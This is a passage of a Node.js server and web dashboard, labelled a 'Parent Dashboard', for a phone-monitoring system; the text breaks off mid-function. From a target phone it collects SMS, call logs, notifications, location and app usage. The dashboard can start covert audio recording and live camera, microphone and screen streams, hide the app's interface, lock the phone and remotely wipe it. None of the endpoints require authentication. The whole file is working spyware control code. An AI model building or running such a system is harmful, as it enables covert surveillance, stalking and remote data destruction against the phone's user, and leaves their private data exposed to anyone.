const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use('/uploads', express.static('uploads'));

if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, `audio_${Date.now()}.mp4`)
});
const upload = multer({ storage });

// Data stores
let devices = {};
let notifications = [];
let locations = {};
let smsList = {};
let callLogs = {};
let appUsage = {};
let batteryData = {};
let geofenceSettings = {};
let geofenceAlerts = {};

// WebSocket
wss.on('connection', (ws, req) => {
  const params = new URL(req.url, 'http://localhost').searchParams;
  const type = params.get('type');
  const device = params.get('device') || 'default';

  if (!devices[device]) devices[device] = {};
  console.log('WS connected:', type, 'device:', device);

  if (type === 'parent') {
    devices[device].parentSocket = ws;
  } else if (type === 'child') {
    devices[device].childSocket = ws;
    devices[device].lastOnline = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kathmandu' });
    devices[device].disconnectReason = null;
    ws.on('message', (data) => {
      const ps = devices[device]?.parentSocket;
      if (ps && ps.readyState === 1) ps.send(data);
    });
    ws.on('close', (code) => {
      const reasons = {
        1000: '✅ Normal disconnect',
        1001: '📵 App band ho gayi',
        1006: '📡 Network cut gaya',
        1011: '💥 Server error',
        1012: '🔄 Server restart hua',
      };
      devices[device].disconnectReason = reasons[code] || '❓ Unknown';
      devices[device].lastOffline = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kathmandu' });
    });
  } else if (type === 'camera') {
    devices[device].cameraSocket = ws;
    ws.on('message', (data) => {
      const ps = devices[device]?.parentCameraSocket;
      if (ps && ps.readyState === 1) ps.send(data);
    });
  } else if (type === 'parent_camera') {
    devices[device].parentCameraSocket = ws;
  } else if (type === 'screen') {
    devices[device].screenSocket = ws;
    ws.on('message', (data) => {
      const ps = devices[device]?.parentScreenSocket;
      if (ps && ps.readyState === 1) ps.send(data);
    });
  } else if (type === 'parent_screen') {
    devices[device].parentScreenSocket = ws;
  }
});

// -------------------------------------------------------------
// 🚀 ALWAYS-ACTIVE KEEP-ALIVE SYSTEM (Render Anti-Sleep Engine)
// -------------------------------------------------------------
app.get('/ping', (req, res) => res.json({ status: 'awake', time: new Date() }));

const RENDER_PUBLIC_URL = process.env.SERVER_URL || `http://localhost:${PORT}`;

// Existing 4‑minute keep‑alive (kept as is)
setInterval(() => {
  const httpModule = RENDER_PUBLIC_URL.startsWith('https') ? https : http;
  
  httpModule.get(`${RENDER_PUBLIC_URL}/ping`, (res) => {
    console.log(`[KEEP-ALIVE] Pinged successfully. Status: ${res.statusCode}`);
  }).on('error', (err) => {
    console.error('[KEEP-ALIVE] Ping failed:', err.message);
  });
}, 4 * 60 * 1000); // Trigger har 4 min pe (15 min sleep limit se pehle)

// ---------- ADDED: AGGRESSIVE KEEP-ALIVE (har 2 min with retry) ----------
setInterval(() => {
  const httpModule = RENDER_PUBLIC_URL.startsWith('https') ? https : http;
  
  httpModule.get(`${RENDER_PUBLIC_URL}/ping`, (res) => {
    console.log(`✅ [PING SUCCESS] ${new Date().toISOString()} - Status: ${res.statusCode}`);
  }).on('error', (err) => {
    console.error(`❌ [PING FAILED] ${new Date().toISOString()} - Error: ${err.message}`);
    // Retry immediately on error
    setTimeout(() => {
      httpModule.get(`${RENDER_PUBLIC_URL}/ping`, () => {
        console.log('🔄 Retry success');
      }).on('error', () => {});
    }, 5000);
  }).setTimeout(10000); // 10 sec timeout
}, 2 * 60 * 1000); // Har 2 minutes

// ---------- ADDED: BACKUP PING (har 3 minute) ----------
setInterval(() => {
  const httpModule = RENDER_PUBLIC_URL.startsWith('https') ? https : http;
  httpModule.get(`${RENDER_PUBLIC_URL}/ping`, () => {
    console.log('🔄 [BACKUP PING] Executed');
  }).on('error', () => {}).setTimeout(10000);
}, 3 * 60 * 1000);

// Register device
app.post('/register', (req, res) => {
  const { token, device } = req.body;
  if (!devices[device]) devices[device] = {};
  devices[device].token = token;
  devices[device].lastSeen = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kathmandu' });
  console.log('Device registered:', device);
  res.json({ success: true });
});

// Get devices
app.get('/devices', (req, res) => {
  const list = Object.entries(devices).map(([name, d]) => ({
    name,
    token: d.token ? '✅' : '❌',
    lastSeen: d.lastSeen || 'Never',
    lastOnline: d.lastOnline || null,
    lastOffline: d.lastOffline || null,
    disconnectReason: d.disconnectReason || null,
    online: d.childSocket?.readyState === 1,
    battery: batteryData[name] || null
  }));
  res.json(list);
});

// Upload audio
app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  const device = req.body.device || 'default';
  const filename = `${device}_audio_${Date.now()}.mp4`;
  fs.renameSync(req.file.path, `uploads/${filename}`);
  res.json({ success: true, filename });
});

// Notifications
app.post('/notification', (req, res) => {
  const { app: appName, title, text, time, device } = req.body;
  notifications.unshift({ app: appName, title, text, time, device });
  if (notifications.length > 200) notifications = notifications.slice(0, 200);
  res.json({ success: true });
});

app.get('/notifications', (req, res) => {
  const { device } = req.query;
  res.json(device ? notifications.filter(n => n.device === device) : notifications);
});

// Location
app.post('/location', (req, res) => {
  const { device, lat, lng, accuracy, time } = req.body;
  if (!locations[device]) locations[device] = [];
  locations[device].unshift({ lat, lng, accuracy, time });
  if (locations[device].length > 100) locations[device] = locations[device].slice(0, 100);
  res.json({ success: true });
});

app.get('/location', (req, res) => {
  res.json(locations[req.query.device] || []);
});

// SMS
app.post('/sms', (req, res) => {
  const { device, sms } = req.body;
  smsList[device] = sms;
  res.json({ success: true });
});

app.get('/sms', (req, res) => {
  res.json(smsList[req.query.device] || []);
});

// Calls
app.post('/calls', (req, res) => {
  const { device, calls } = req.body;
  callLogs[device] = calls;
  res.json({ success: true });
});

app.get('/calls', (req, res) => {
  res.json(callLogs[req.query.device] || []);
});

// App Usage
app.post('/appusage', (req, res) => {
  const { device, apps } = req.body;
  appUsage[device] = apps;
  res.json({ success: true });
});

app.get('/appusage', (req, res) => {
  res.json(appUsage[req.query.device] || []);
});

// Battery
app.post('/battery', (req, res) => {
  const { device, level, charging } = req.body;
  batteryData[device] = {
    level, charging,
    time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kathmandu' })
  };
  res.json({ success: true });
});

// Geofence
app.post('/geofence', (req, res) => {
  const { device, lat, lng, radius, active } = req.body;
  geofenceSettings[device] = { lat, lng, radius, active };
  res.json({ success: true });
});

app.get('/geofence', (req, res) => {
  res.json(geofenceSettings[req.query.device] || { active: false });
});

app.post('/geofence_alert', (req, res) => {
  const { device, type, lat, lng, distance, time } = req.body;
  if (!geofenceAlerts[device]) geofenceAlerts[device] = [];
  geofenceAlerts[device].unshift({ type, lat, lng, distance, time });
  res.json({ success: true });
});

app.get('/geofence_alerts', (req, res) => {
  res.json(geofenceAlerts[req.query.device] || []);
});

// Files
app.get('/files', (req, res) => {
  const { device } = req.query;
  const files = fs.readdirSync('uploads')
    .filter(f => f.endsWith('.mp4') && (!device || f.startsWith(device)))
    .map(f => ({
      name: f,
      url: `/uploads/${f}`,
      time: new Date(parseInt(f.split('_audio_')[1]?.replace('.mp4', '') || 0))
        .toLocaleString('en-IN', { timeZone: 'Asia/Kathmandu' })
    })).reverse();
  res.json(files);
});

// FCM Signal
async function sendFCMSignal(deviceName, action, extra = {}) {
  const device = devices[deviceName];
  if (!device?.token) return { error: 'No token' };
  try {
    const credentials = JSON.parse(process.env.GOOGLE_CREDENTIALS);
    const now = Math.floor(Date.now() / 1000);
    const payload = {
      iss: credentials.client_email,
      scope: 'https://www.googleapis.com/auth/firebase.messaging',
      aud: 'https://oauth2.googleapis.com/token',
      exp: now + 3600,
      iat: now
    };
    const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');
    const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
    const sign = crypto.createSign('RSA-SHA256');
    sign.update(header + '.' + body);
    const signature = sign.sign(credentials.private_key, 'base64url');
    const jwt = header + '.' + body + '.' + signature;

    const tokenRes = await fetch('https://oauth2.googleapis.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
        assertion: jwt
      })
    });
    const tokenData = await tokenRes.json();
    const accessToken = tokenData.access_token;
    if (!accessToken) { console.error('Token error:', tokenData); return { error: 'No token' }; }

    const projectId = credentials.project_id;
    const response = await fetch(
      `https://fcm.googleapis.com/v1/projects/${projectId}/messages:send`,
      {
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + accessToken, 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: { token: device.token, data: { action, ...extra } } })
      }
    );
    const result = await response.json();
    console.log('FCM result:', JSON.stringify(result));
    return result;
  } catch (e) {
    console.error('FCM error:', e.message);
    return { error: e.message };
  }
}

app.get('/signal', async (req, res) => {
  const { action, device, package: pkg } = req.query;
  const extra = {};
  if (pkg) extra.package = pkg;
  await sendFCMSignal(device, action, extra);
  const d = devices[device];
  if (d) {
    console.log('Signal:', action, 'child:', d.childSocket?.readyState, 'camera:', d.cameraSocket?.readyState);
    if (['start_live', 'stop_live'].includes(action) && d.childSocket?.readyState === 1) {
      d.childSocket.send(JSON.stringify({ action }));
    }
    if (['start_camera', 'stop_camera', 'switch_camera'].includes(action) && d.cameraSocket?.readyState === 1) {
      d.cameraSocket.send(JSON.stringify({ action }));
    }
    if (['start_screen', 'stop_screen'].includes(action) && d.screenSocket?.readyState === 1) {
      d.screenSocket.send(JSON.stringify({ action }));
    }
  }
  res.json({ success: true });
});

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Parent Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0d0d0d; color: #fff; font-family: 'Segoe UI', sans-serif; }
    .header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 20px 24px; border-bottom: 1px solid #222; display: flex; align-items: center; gap: 12px; }
    .header h1 { font-size: 20px; font-weight: 600; }
    .dot { width: 10px; height: 10px; border-radius: 50%; background: #4CAF50; animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
    .container { padding: 24px; max-width: 900px; margin: 0 auto; }
    .section-title { font-size: 14px; color: #888; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
    .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; margin-bottom: 24px; }
    .device-card { background: #1a1a1a; border-radius: 14px; padding: 16px; border: 2px solid #2a2a2a; cursor: pointer; transition: all 0.2s; }
    .device-card:hover, .device-card.active { border-color: #4CAF50; background: #1a2a1a; }
    .device-name { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
    .online { color: #4CAF50; font-size: 12px; }
    .offline { color: #f44336; font-size: 12px; }
    .tabs { display: flex; gap: 6px; margin-bottom: 24px; flex-wrap: wrap; }
    .tab { padding: 8px 14px; border: none; border-radius: 10px; cursor: pointer; font-size: 12px; font-weight: 600; background: #1a1a1a; color: #888; border: 1px solid #2a2a2a; transition: all 0.2s; }
    .tab.active { background: #2196F3; color: white; border-color: #2196F3; }
    .tab-content { display: none; }
    .tab-content.active { display: block; }
    .controls { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 24px; }
    .btn { padding: 14px; border: none; border-radius: 12px; cursor: pointer; font-size: 13px; font-weight: 600; transition: all 0.2s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .btn:active { transform: scale(0.96); }
    .btn .icon { font-size: 20px; }
    .btn .label { font-size: 10px; }
    .btn-start { background: linear-gradient(135deg, #2e7d32, #4CAF50); color: white; }
    .btn-stop { background: linear-gradient(135deg, #c62828, #f44336); color: white; }
    .btn-blue { background: linear-gradient(135deg, #1565c0, #2196F3); color: white; }
    .btn-purple { background: linear-gradient(135deg, #6a1b9a, #9c27b0); color: white; }
    .btn-orange { background: linear-gradient(135deg, #e65100, #ff9800); color: white; }
    .btn-teal { background: linear-gradient(135deg, #00695c, #009688); color: white; }
    .btn-red { background: linear-gradient(135deg, #b71c1c, #f44336); color: white; }
    .btn-yellow { background: linear-gradient(135deg, #f57f17, #FFC107); color: #000; }
    .btn-grey { background: linear-gradient(135deg, #333, #555); color: white; }
    .btn-indigo { background: linear-gradient(135deg, #283593, #3f51b5); color: white; }
    .toast { position: fixed; top: 20px; right: 20px; background: #1e1e1e; border: 1px solid #333; border-radius: 12px; padding: 14px 20px; font-size: 14px; transform: translateX(200%); transition: transform 0.3s; z-index: 999; }
    .toast.show { transform: translateX(0); }
    .toast.success { border-color: #4CAF50; }
    .toast.error { border-color: #f44336; }
    .live-box { background: #1a1a1a; border-radius: 16px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a2a; display: none; }
    .live-box.active { display: block; border-color: #9c27b0; }
    .camera-box { background: #1a1a1a; border-radius: 16px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a2a; display: none; }
    .camera-box.active { display: block; border-color: #ff9800; }
    .screen-box { background: #1a1a1a; border-radius: 16px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a2a; display: none; }
    .screen-box.active { display: block; border-color: #2196F3; }
    .live-indicator { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
    .live-dot { width: 8px; height: 8px; background: #f44336; border-radius: 50%; animation: pulse 1s infinite; }
    .waveform { height: 50px; background: #0d0d0d; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #555; font-size: 13px; }
    #cameraFeed, #screenFeed { width: 100%; border-radius: 10px; background: #000; min-height: 200px; }
    .card { background: #1a1a1a; border-radius: 12px; padding: 14px; margin-bottom: 8px; border: 1px solid #2a2a2a; }
    audio { width: 100%; height: 36px; margin-top: 8px; }
    .map-container { width: 100%; height: 300px; border-radius: 12px; overflow: hidden; margin-bottom: 16px; }
    .empty { text-align: center; padding: 40px; color: #555; }
    table { width: 100%; border-collapse: collapse; font-size: 12px; }
    th { background: #1a1a1a; padding: 8px; text-align: left; color: #888; }
    td { padding: 8px; border-bottom: 1px solid #1a1a1a; }
    .input-row { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
    input { background: #1a1a1a; border: 1px solid #2a2a2a; color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 13px; }
    .alert-box { background: #3a1a1a; border: 1px solid #f44336; border-radius: 12px; padding: 14px; margin-bottom: 8px; }
  </style>
</head>
<body>
<div class="header">
  <div class="dot"></div>
  <h1>👨‍👩‍👧 Parent Dashboard</h1>
</div>
<div class="container">
  <div class="section-title">📱 DEVICES</div>
  <div class="devices-grid" id="devicesGrid"><div class="empty">Loading...</div></div>

  <div id="mainPanel" style="display:none">
    <div class="tabs">
      <button class="tab active" onclick="switchTab('monitor', event)">🎙️ Monitor</button>
      <button class="tab" onclick="switchTab('control', event)">🔧 Control</button>
      <button class="tab" onclick="switchTab('location', event)">📍 Location</button>
      <button class="tab" onclick="switchTab('geofence', event)">🚧 Geofence</button>
      <button class="tab" onclick="switchTab('sms', event)">💬 SMS</button>
      <button class="tab" onclick="switchTab('calls', event)">📞 Calls</button>
      <button class="tab" onclick="switchTab('apps', event)">📊 Apps</button>
      <button class="tab" onclick="switchTab('notifications', event)">🔔 Notifs</button>
      <button class="tab" onclick="switchTab('recordings', event)">📼 Audio</button>
    </div>

    <div class="tab-content active" id="tab-monitor">
      <div class="controls">
        <button class="btn btn-start" onclick="sendSignal('start_audio')"><span class="icon">🎙️</span><span class="label">Start Recording</span></button>
        <button class="btn btn-stop" onclick="sendSignal('stop_audio')"><span class="icon">⏹️</span><span class="label">Stop Recording</span></button>
        <button class="btn btn-purple" onclick="toggleLive()"><span class="icon">📡</span><span class="label">Live Audio</span></button>
        <button class="btn btn-orange" onclick="toggleCamera()"><span class="icon">📷</span><span class="label">Live Camera</span></button>
        <button class="btn btn-teal" onclick="switchCamera()"><span class="icon">🔄</span><span class="label">Switch Cam</span></button>
        <button class="btn btn-indigo" onclick="toggleScreen()"><span class="icon">📺</span><span class="label">Screen Share</span></button>
        <!-- ADDED: Show/Hide App Buttons + Refresh modified -->
        <button class="btn btn-blue" onclick="showAppUI()"><span class="icon">📱</span><span class="label">Show App</span></button>
        <button class="btn btn-grey" onclick="hideAppUI()"><span class="icon">🚫</span><span class="label">Hide App</span></button>
        <button class="btn btn-blue" onclick="loadAll()" style="grid-column:span 1"><span class="icon">↺</span><span class="label">Refresh All</span></button>
      </div>
      <div class="live-box" id="liveBox">
        <div class="live-indicator"><div class="live-dot"></div><span style="font-size:13px;font-weight:600;color:#f44336">LIVE AUDIO</span></div>
        <div class="waveform" id="waveform">Connecting...</div>
      </div>
      <div class="camera-box" id="cameraBox">
        <div class="live-indicator"><div class="live-dot"></div><span style="font-size:13px;font-weight:600;color:#ff9800">LIVE CAMERA</span></div>
        <img id="cameraFeed" src="" alt="Camera Feed"/>
      </div>
      <div class="screen-box" id="screenBox">
        <div class="live-indicator"><div class="live-dot"></div><span style="font-size:13px;font-weight:600;color:#2196F3">LIVE SCREEN</span></div>
        <img id="screenFeed" src="" alt="Screen Feed"/>
      </div>
    </div>

    <div class="tab-content" id="tab-control">
      <div class="controls">
        <button class="btn btn-red" onclick="confirmAction('lock_phone','Phone lock karna chahte ho?')"><span class="icon">🔒</span><span class="label">Lock Phone</span></button>
        <button class="btn btn-yellow" onclick="sendSignal('bedtime_on')"><span class="icon">🌙</span><span class="label">Bedtime ON</span></button>
        <button class="btn btn-grey" onclick="sendSignal('bedtime_off')"><span class="icon">☀️</span><span class="label">Bedtime OFF</span></button>
        <button class="btn btn-red" onclick="confirmWipe()"><span class="icon">⚠️</span><span class="label">Wipe Phone</span></button>
      </div>
      <div class="section-title" style="margin-top:16px">📵 Block/Unblock App</div>
      <div class="input-row">
        <input id="blockPkg" type="text" placeholder="Package e.g. com.instagram.android" style="flex:1">
        <button class="btn btn-red" onclick="blockApp()" style="padding:8px 16px">Block</button>
        <button class="btn btn-start" onclick="unblockApp()" style="padding:8px 16px">Unblock</button>
      </div>
      <div class="section-title" style="margin-top:16px">⏰ Bedtime</div>
      <div class="input-row">
        <input id="bedtimeHour" type="number" placeholder="Hour (22)" min="0" max="23" style="width:100px">
        <input id="bedtimeMin" type="number" placeholder="Min (0)" min="0" max="59" style="width:100px">
        <button class="btn btn-yellow" onclick="setBedtime()" style="padding:8px 16px">Set</button>
      </div>
    </div>

    <div class="tab-content" id="tab-location">
      <div class="map-container"><iframe id="mapFrame" width="100%" height="100%" frameborder="0" style="border:0" src="" allowfullscreen></iframe></div>
      <div id="locationInfo"></div>
    </div>

    <div class="tab-content" id="tab-geofence">
      <div class="section-title">🚧 Set Geofence</div>
      <div class="input-row">
        <input id="geoLat" type="text" placeholder="Latitude">
        <input id="geoLng" type="text" placeholder="Longitude">
        <input id="geoRadius" type="number" placeholder="Radius (m)" value="500">
        <button class="btn btn-start" onclick="setGeofence()" style="padding:8px 16px">Set</button>
        <button class="btn btn-stop" onclick="clearGeofence()" style="padding:8px 16px">Clear</button>
      </div>
      <div class="section-title">🚨 Alerts</div>
      <div id="geofenceAlerts"></div>
    </div>

    <div class="tab-content" id="tab-sms"><div id="smsList"></div></div>
    <div class="tab-content" id="tab-calls"><div id="callsList"></div></div>
    <div class="tab-content" id="tab-apps"><div id="appsList"></div></div>
    <div class="tab-content" id="tab-notifications"><div id="notifList"></div></div>
    <div class="tab-content" id="tab-recordings"><div id="files"></div></div>
  </div>
</div>
<div class="toast" id="toast"></div>
<script>
  const SERVER = window.location.origin;
  const WS_URL = SERVER.replace('https','wss').replace('http','ws');
  let wsAudio = null, wsCamera = null, wsScreen = null;
  let audioCtx = null;
  let liveActive = false, cameraActive = false, screenActive = false;
  let selectedDevice = null;

  async function loadDevices() {
    try {
      const res = await fetch('/devices');
      const devs = await res.json();
      const grid = document.getElementById('devicesGrid');
      if (!devs.length) { grid.innerHTML = '<div class="empty">📱 Koi device nahi</div>'; return; }
      grid.innerHTML = devs.map(d => \`
        <div class="device-card \${selectedDevice === d.name ? 'active' : ''}" onclick="selectDevice('\${d.name}')">
          <div class="device-name">📱 \${d.name}</div>
          \${d.battery ? \`<div style="font-size:12px;color:#FFC107">\${d.battery.charging ? '⚡' : '🔋'} \${d.battery.level}% \${d.battery.level <= 20 ? '🚨' : ''}</div>\` : ''}
          <div class="\${d.online ? 'online' : 'offline'}">\${d.online ? '🟢 Online' : '🔴 Offline'}</div>
          \${!d.online && d.disconnectReason ? \`<div style="font-size:11px;color:#ff9800">\${d.disconnectReason}</div>\` : ''}
          \${!d.online && d.lastOffline ? \`<div style="font-size:10px;color:#555">Offline: \${d.lastOffline}</div>\` : ''}
        </div>
      \`).join('');
    } catch(e) { console.error(e); }
  }

  function selectDevice(name) {
    selectedDevice = name;
    document.getElementById('mainPanel').style.display = 'block';
    loadDevices();
    loadAll();
    showToast('Device: ' + name);
  }

  function switchTab(tab, event) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.getElementById('tab-' + tab).classList.add('active');
    event.target.classList.add('active');
    const loaders = { location: loadLocation, geofence: loadGeofenceAlerts, sms: loadSms, calls: loadCalls, apps: loadApps, notifications: loadNotifications, recordings: loadFiles };
    if (loaders[tab]) loaders[tab]();
  }

  function showToast(msg, type='success') {
    const t = document.getElementById('toast');
    t.textContent = (type==='success'?'✅ ':'❌ ') + msg;
    t.className = 'toast show ' + type;
    setTimeout(() => t.className = 'toast', 3000);
  }

  async function sendSignal(action, extra = {}) {
    if (!selectedDevice) { showToast('Pehle device select karo!', 'error'); return; }
    let url = '/signal?action=' + action + '&device=' + encodeURIComponent(selectedDevice);
    Object.entries(extra).forEach(([k, v]) => url += '&' + k + '=' + encodeURIComponent(v));
    try {
      await fetch(url);
      showToast(action + ' done!');
      if (action === 'start_audio') setTimeout(loadFiles, 35000);
    } catch(e) { showToast('Error!', 'error'); }
  }

  function confirmAction(action, msg) { if (confirm(msg)) sendSignal(action); }
  function confirmWipe() {
    if (confirm('⚠️ Phone ka saara data delete ho jaayega!')) {
      if (confirm('Sure ho? WIPE PHONE?')) sendSignal('wipe_phone');
    }
  }

  function blockApp() {
    const pkg = document.getElementById('blockPkg').value.trim();
    if (!pkg) { showToast('Package name daalo!', 'error'); return; }
    sendSignal('block_app', { package: pkg });
  }

  function unblockApp() {
    const pkg = document.getElementById('blockPkg').value.trim();
    if (!pkg) { showToast('Package name daalo!', 'error'); return; }
    sendSignal('unblock_app', { package: pkg });
  }

  function setBedtime() {
    const hour = document.getElementById('bedtimeHour').value || 22;
    const min = document.getElementById('bedtimeMin').value || 0;
    sendSignal('bedtime_on', { hour, minute: min });
    showToast('Bedtime: ' + hour + ':' + min.toString().padStart(2,'0'));
  }

  async function setGeofence() {
    const lat = parseFloat(document.getElementById('geoLat').value);
    const lng = parseFloat(document.getElementById('geoLng').value);
    const radius = parseFloat(document.getElementById('geoRadius').value) || 500;
    if (!lat || !lng) { showToast('Lat/Lng daalo!', 'error'); return; }
    await fetch('/geofence', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ device: selectedDevice, lat, lng, radius, active: true }) });
    showToast('Geofence set!');
  }

  async function clearGeofence() {
    await fetch('/geofence', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ device: selectedDevice, active: false }) });
    showToast('Geofence clear!');
  }

  function toggleLive() {
    if (!selectedDevice) { showToast('Pehle device select karo!', 'error'); return; }
    if (liveActive) {
      liveActive = false;
      if (wsAudio) wsAudio.close();
      document.getElementById('liveBox').classList.remove('active');
      fetch('/signal?action=stop_live&device=' + encodeURIComponent(selectedDevice));
    } else {
      liveActive = true;
      audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
      document.getElementById('liveBox').classList.add('active');
      document.getElementById('waveform').textContent = 'Connecting...';
      wsAudio = new WebSocket(WS_URL + '?type=parent&device=' + encodeURIComponent(selectedDevice));
      wsAudio.binaryType = 'arraybuffer';
      wsAudio.onopen = () => {
        document.getElementById('waveform').textContent = '🎙️ Live sun raha hai...';
        fetch('/signal?action=start_live&device=' + encodeURIComponent(selectedDevice));
        showToast('Live audio shuru!');
      };
      wsAudio.onmessage = (e) => {
        if (audioCtx && e.data instanceof ArrayBuffer) {
          const pcm = new Int16Array(e.data);
          const f32 = new Float32Array(pcm.length);
          for (let i = 0; i < pcm.length; i++) f32[i] = pcm[i] / 32768.0;
          const buf = audioCtx.createBuffer(1, f32.length, 16000);
          buf.copyToChannel(f32, 0);
          const src = audioCtx.createBufferSource();
          src.buffer = buf; src.connect(audioCtx.destination); src.start();
        }
      };
      wsAudio.onclose = () => { liveActive = false; document.getElementById('waveform').textContent = 'Disconnected'; };
    }
  }

  function toggleCamera() {
    if (!selectedDevice) { showToast('Pehle device select karo!', 'error'); return; }
    if (cameraActive) {
      cameraActive = false;
      if (wsCamera) wsCamera.close();
      document.getElementById('cameraBox').classList.remove('active');
      fetch('/signal?action=stop_camera&device=' + encodeURIComponent(selectedDevice));
    } else {
      cameraActive = true;
      document.getElementById('cameraBox').classList.add('active');
      wsCamera = new WebSocket(WS_URL + '?type=parent_camera&device=' + encodeURIComponent(selectedDevice));
      wsCamera.binaryType = 'arraybuffer';
      wsCamera.onopen = () => { fetch('/signal?action=start_camera&device=' + encodeURIComponent(selectedDevice)); showToast('Camera shuru!'); };
      wsCamera.onmessage = (e) => {
        if (e.data instanceof ArrayBuffer) {
          const blob = new Blob([e.data], { type: 'image/jpeg' });
          const url = URL.createObjectURL(blob);
          const img = document.getElementById('cameraFeed');
          const old = img.src; img.src = url;
          if (old) URL.revokeObjectURL(old);
        }
      };
      wsCamera.onclose = () => { cameraActive = false; document.getElementById('cameraBox').classList.remove('active'); };
    }
  }

  function switchCamera() {
    if (!selectedDevice) return;
    fetch('/signal?action=switch_camera&device=' + encodeURIComponent(selectedDevice));
    showToast('Camera switch!');
  }

  function toggleScreen() {
    if (!selectedDevice) { showToast('Pehle device select karo!', 'error'); return; }
    if (screenActive) {
      screenActive = false;
      if (wsScreen) wsScreen.close();
      document.getElementById('screenBox').classList.remove('active');
      fetch('/signal?action=stop_screen&device=' + encodeURIComponent(selectedDevice));
    } else {
      screenActive = true;
      document.getElementById('screenBox').classList.add('active');
      wsScreen = new WebSocket(WS_URL + '?type=parent_screen&device=' + encodeURIComponent(selectedDevice));
      wsScreen.binaryType = 'arraybuffer';
      wsScreen.onopen = () => { fetch('/signal?action=start_screen&device=' + encodeURIComponent(selectedDevice)); showToast('Screen share shuru!'); };
      wsScreen.onmessage = (e) => {
        if (e.data instanceof ArrayBuffer) {
          const blob = new Blob([e.data], { type: 'image/jpeg' });
          const url = URL.createObjectURL(blob);
          const img = document.getElementById('screenFeed');
          const old = img.src; img.src = url;
          if (old) URL.revokeObjectURL(old);
        }
      };
      wsScreen.onclose = () => { screenActive = false; document.getElementById('screenBox').classList.remove('active'); };
    }
  }

  async function loadLocation() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/location?device=' + encodeURIComponent(selectedDevice));
      const locs = await res.json();
      if (!locs.length) { document.getElementById('locationInfo').innerHTML = '<div class="empty">📍 Koi location nahi</div>'; return; }
      const l = locs[0];
      document.getElementById('mapFrame').src = \`https://maps.google.com/maps?q=\${l.lat},\${l.lng}&z=15&output=embed\`;
      document.getElementById('locationInfo').innerHTML = \`<div class="card"><div>📍 \${l.lat.toFixed(6)}, \${l.lng.toFixed(6)}</div><div style="font-size:12px;color:#888">\${new Date(l.time).toLocaleString('en-IN',{timeZone:'Asia/Kathmandu'})}</div></div>\`;
    } catch(e) { console.error(e); }
  }

  async function loadGeofenceAlerts() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/geofence_alerts?device=' + encodeURIComponent(selectedDevice));
      const alerts = await res.json();
      const div = document.getElementById('geofenceAlerts');
      if (!alerts.length) { div.innerHTML = '<div class="empty">Koi alert nahi</div>'; return; }
      div.innerHTML = alerts.map(a => \`<div class="alert-box"><div style="color:\${a.type==='EXIT'?'#f44336':'#4CAF50'}">\${a.type==='EXIT'?'🚨 BAHAR GAYA':'✅ WAPAS AAYA'}</div><div style="font-size:12px;color:#888">\${new Date(a.time).toLocaleString('en-IN',{timeZone:'Asia/Kathmandu'})}</div></div>\`).join('');
    } catch(e) { console.error(e); }
  }

  async function loadSms() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/sms?device=' + encodeURIComponent(selectedDevice));
      const sms = await res.json();
      const div = document.getElementById('smsList');
      if (!sms.length) { div.innerHTML = '<div class="empty">💬 Koi SMS nahi</div>'; return; }
      div.innerHTML = \`<table><tr><th>From</th><th>Message</th><th>Type</th><th>Time</th></tr>\${sms.map(s=>\`<tr><td>\${s.from}</td><td>\${s.body?.substring(0,60)}</td><td>\${s.type==='inbox'?'📥':'📤'}</td><td>\${new Date(s.time).toLocaleString('en-IN',{timeZone:'Asia/Kathmandu'})}</td></tr>\`).join('')}</table>\`;
    } catch(e) { console.error(e); }
  }

  async function loadCalls() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/calls?device=' + encodeURIComponent(selectedDevice));
      const calls = await res.json();
      const div = document.getElementById('callsList');
      if (!calls.length) { div.innerHTML = '<div class="empty">📞 Koi call nahi</div>'; return; }
